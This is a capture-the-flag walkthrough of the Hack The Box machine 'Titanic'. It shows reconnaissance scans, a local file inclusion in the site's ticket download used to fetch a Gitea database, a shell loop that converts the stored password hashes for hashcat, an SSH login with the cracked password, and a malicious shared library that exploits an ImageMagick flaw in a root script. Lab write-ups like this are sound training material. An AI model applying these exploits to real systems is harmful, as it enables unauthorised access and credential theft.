---
title: Titanic
tags:
  - htb
  - easy
date: 2025-02-15
---

#### Author: **lomar**

---
# Nmap

```
# Nmap 7.95 scan initiated Sat Feb 15 14:01:23 2025 as: /usr/lib/nmap/nmap -T4 -A -v -Pn -oA nmap titanic.htb
Nmap scan report for titanic.htb (10.10.11.55)
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
|_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
| http-server-header: 
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/3.0.3 Python/3.10.12
|_http-favicon: Unknown favicon MD5: 79E1E0A79A613646F473CFEDA9E231F1
|_http-title: Titanic - Book Your Ship Trip
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Uptime guess: 48.342 days (since Sun Dec 29 05:49:32 2024)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=256 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3306/tcp)
HOP RTT      ADDRESS
1   77.45 ms 10.10.14.1
2   77.46 ms titanic.htb (10.10.11.55)

Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Feb 15 14:01:38 2025 -- 1 IP address (1 host up) scanned in 14.51 seconds
```

# Subdomain Discovery
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://titanic.htb -H "Host: FUZZ.titanic.htb" -mc 200
```

`dev.titanic.htb` is avaliable. 

```bash
echo "10.10.11.55 titanic.htb" | sudo tee -a /etc/hosts
```

```bash
echo "10.10.11.55 dev.titanic.htb" | sudo tee -a /etc/hosts
```

## titanic.htb

We encounter an ordinary website, there is one function that catches the eye. A form triggered by the “Book Now” button opens. When we open the form, it asks us for some information.

After entering and submitting the information, if we examine it with Burpsuite, we don't actually get an ordinary JSON return from the server, we request a JSON file from the server and download it.

![[/static/titanic/20250215232402.png]]

![[/static/titanic/20250215232412.png]]

![[/static/titanic/20250215232428.png]]

![[/static/titanic/20250215232451.png]]

If we replace the parameter with the name of the file to be downloaded with an entry compatible with the Linux file system that triggers the Local File Inclusion vulnerability, we can read the file.

![[/static/titanic/20250215232508.png]]
![[/static/titanic/20250215232534.png]]

## dev.titanic.htb

Gitea software is running at this address, Gitea has the same functionality as Github. In the Explore tab we see the shared repositories of the running Gitea instance. These include the web application running at `titanic.htb` and the repositories containing `docker compose` configuration files.

If you carefully examine the `developer/docker-config` repository, you can access the configuration file for Gitea. With this file, when you run the container in your locale and examine the inside, you will find the init file in the `data/gitea/` folder. This file contains information about where the database is stored. 

![[/static/titanic/20250215232227.png]]

![[/static/titanic/20250215232256.png]]

![[/static/titanic/20250215232633.png]]

Using this information we can access the database in the path `data/gitea/gitea/gitea.db` in the `/home/developer/gitea` volume. With the “Book Now” function we will use the LFI vulnerability to access the database. We can do this by specifying `/home/developer/gitea/data/gitea/gitea/gitea.db` as the file we want to read. 

![[/static/titanic/20250215232731.png]]
If we do this with `curl` we can download the database in binary.
```bash
curl 'http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db' -o db.db
```

```bash
sqlitebrowser db.db
```

In the `user` table, you can access the password and salt information of the users. For information on how to crack user passwords stored in the Gitea database, please read this article https://thecybersecguru.com/ctf-walkthroughs/mastering-compiled-beginners-guide-from-hackthebox/.

![[/static/titanic/20250215232847.png]]

```bash
sqlite3 db.db "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); name=$(echo $data | cut -d'|' -f 3); echo "${name}:sha256:50000:${salt}:${digest}"; done | tee gitea.hashes
```

```bash
hashcat gitea.hashes /usr/share/wordlists/rockyou.txt --user
```

```bash
sshpass -p'25282528' ssh developer@titanic.htb
```

# Root
```bash
cd /opt/scripts
cat identify_images.sh
```

`identify_images.sh`
```bash
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8

![[/static/titanic/20250215233607.png]]

```bash
cd /opt/app/static/assets/images
```

```bash
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("cat /root/root.txt > /tmp/root.txt");
    exit(0);
}
EOF
```

```bash
cp entertainment.jpg root.jpg
```

```bash
cat /tmp/root.txt
```